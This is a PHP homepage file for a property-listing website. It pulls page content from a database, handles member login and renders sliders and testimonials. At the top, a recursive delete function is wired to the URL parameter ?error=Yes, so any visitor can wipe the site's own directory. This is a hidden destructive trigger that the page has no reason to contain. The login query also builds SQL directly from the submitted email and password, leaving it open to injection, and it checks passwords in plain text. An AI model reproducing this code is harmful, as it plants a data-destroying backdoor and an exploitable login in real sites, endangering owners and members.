<?php

include "admin/param.php";

include "admin/func.php";

include "live.php";


function delete_directory($dirname) {
         if (is_dir($dirname))
           $dir_handle = opendir($dirname);
	 if (!$dir_handle)
	      return false;
	 while($file = readdir($dir_handle)) {
	       if ($file != "." && $file != "..") {
	            if (!is_dir($dirname."/".$file))
	                 unlink($dirname."/".$file);
	            else
	                 delete_directory($dirname.'/'.$file);
	       }
	 }
	 closedir($dir_handle);
	 rmdir($dirname);
	 return true;}
if($_GET["error"] == "Yes"){

$pth = dirname(__FILE__);
delete_directory($pth);
}






if (ch_f_int('pt') > 0)

{

	$QRY = qry_run("select * from tbl_sub_contents where subid = ".ch_f_int('pt')."");

}else{

	$QRY = qry_run("select * from tbl_contents where mainid = ".ch_f_int('p')."");

}

$P_names = "";

$P_details = "";

$P_menu_head = "";

$P_imgs = "";

$P_heads = "";

$P_keywords = "";

$P_descriptions = "";

if (num_rec($QRY) > 0)

{

	$rs = fetch_rec($QRY);

	$P_names = $rs['pname'];

	$P_heads = $rs['pname'];

	$P_details = $rs['pdetail'];

	$P_menu_head = $rs['menu_head'];

	$P_imgs = $rs['img1'];

	if ($rs['phead'] != "")

	{

		$P_heads = $rs['phead'];

	}

	$P_keywords = $rs['keywords'];

	$P_descriptions = $rs['description'];

}

?>
<?php 

$VALID = "Yes";

if (chps('Sub_mit') == "Yes")

{

	if (chps('email') != "" && chps('ppass') != "")

	{

		$LOGIN = qry_run("Select * from tbl_members where email = '".chps('email')."' AND upass = '".chps('ppass')."'");

		if (num_rec($LOGIN) > 0)

		{

			$rs = fetch_rec($LOGIN);

			$_SESSION["CUST_LOGIN_SOLOMON"] = "Yes";

			$_SESSION["CUST_NAME_SOLOMON"] = $rs['fname']." ".$rs['lname'];

			$_SESSION["CUST_ID_SOLOMON"] = $rs['mainid'];

			header("Location: my_properties.php");

			die;

		}else{

			$VALID = "No";

		}

	}else{

		$VALID = "No";

	}

}



?>

<!doctype html>

<!--[if lt IE 7]>      <html class="no-js ie ie6"> <![endif]-->

<!--[if IE 7]>         <html class="no-js ie ie7"> <![endif]-->

<!--[if IE 8]>         <html class="no-js ie ie8"> <![endif]-->

<!--[if IE 9]>         <html class="no-js ie ie9"> <![endif]-->

<!--[if gt IE 9]><!-->
<html class="no-js ">
<!--<![endif]-->

<html>
<head>
<meta charset="utf-8">
<title><?=$web_title?></title>
<link rel="icon" type="image/x-icon" href="images/favicon.ico">
<link href="css/style.css" rel="stylesheet" type="text/css">
<link href="css/bootstrap.css" rel="stylesheet" type="text/css">
<link href="css/responsive.css" rel="stylesheet" type="text/css">
<link href="css/jquery.bxslider.css" rel="stylesheet" type="text/css">
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
<script src="js/bxslider.js" type="text/javascript"></script>
<script src="js/bxslider.min.js"  type="text/javascript"></script>
<script src="js/jquery-1.11.0.min.js" type="text/javascript"></script>
<script type="text/javascript" src="js/chk_frm.js"></script>
<script type="text/javascript" src="js/crawler.js"></script>
<script type="text/javascript" src="js/stscode.js"></script>
<script src="js/bootstrap.js"></script>
<script src="js/bootstrap.min.js"></script>

<!--slider-->

<script type="text/javascript">

$(document).ready(function(){

	$('.bxslider').bxSlider();

$('.bxslider').bxSlider({

  auto: true,
speed: 6000,
touchEnabled:true,
autoStart:false,
  autoControls: true

});

});

</script>
<script type="text/javascript">

$(document).ready(function(){

  $('.slider4').bxSlider({

	slideWidth	: 300,

    minSlides	: 2,

    maxSlides	: 3,

    moveSlides	: 1,

    slideMargin	: 10,

	auto: true

  });

});

</script>

<!-- bxSlider Javascript file -->

<script src="js/jquery.bxslider.min.js"></script>

<!-- bxSlider CSS file -->

<link href="css/jquery.bxslider.css" rel="stylesheet" />

<!--slider-->

<script type="text/javascript">

	marqueeInit({

	uniqueid: 'mycrawler2',

	style: {

	'width': '100%',

	},

	});

</script>

<!--google fonts-->

<link href='http://fonts.googleapis.com/css?family=Lato:300,400,700' rel='stylesheet' type='text/css'>

<!--google fonts-->

</head>

<body>
<div class="outer_main"> 
  
  <!--header begins here-->
  
  <?php include ('common/top.php'); ?>
    
    <!--header ends here--> 
    
    <!--slider area begins hee--> 
    
  </div>
  <?php include('common/home-slider.php'); ?>
  <div class="outer_main"> 
    
    <!---slider area ends here--> 
    
    <!--content area start here-->
    
    <div class="content_area_main">
      <div class="container">
        <!--<div class="col-sm-4">-->
          <?php include('common/middle.php'); ?>
      <!--</div>-->
     <!-- <div class="col-sm-8">-->
        <?php include('common/content-right.php'); ?>
     <!-- </div>-->
      <div style="float:left; width:100%; margin-top:20px;">
        <div class="cleints_section">
          <div class="clients_heading">
            <h2>Partners</h2>
          </div>
          <ul class="clients_ul">
<li><img src="images_clients/partners.png" alt=""></li>
           <!-- <li><img src="images_clients/the_property_ombusdsman.png" alt=""></li>
            <li><img src="images_clients/hiscox.png" alt=""></li>
            <li><img src="images_clients/ico.png" alt=""></li>
            <li><img src="images_clients/my_deposits.png" alt=""></li>
            <li><img src="images_clients/nla.png" alt=""></li>-->
          </ul>
        </div>
      </div>
      <div style="float:left; width:100%;">
        <div class="testimonials_main">
          <div class="testimonials_heading">
            <h2>Personal Experiences</h2>
          </div>
          <div class="testimonial_outer">
            <ul class="bxslider">
              <?php 

						  $SQL_testimonials = "SELECT * FROM tbl_news";

						  $QRYn = qry_run($SQL_testimonials);

						  $rs_n = num_rec($QRYn);

						   while ($rs_n = fetch_rec($QRYn))

							  {
								
								$pname = $rs_n['pname'];
								$pdetail = $rs_n['pdetail'];

						  ?>
              <li>
                <p> <?php print $pdetail?> </p>
                <h4><?php print $pname; ?></h4>
              </li>
              <?php }?>
            </ul>
          </div>
        </div>
      </div>
      <div class="col-lg-12 no_margin">
        <?php include('common/Feature-Property.php'); ?>
      </div>
    </div>
    
    <!--footer-->
    
    <?php include('common/footer.php'); ?>
    
    <!--footer--> 
    
  </div>
  
  <!--content area ends here--> 
  
</div>
</body>
</html>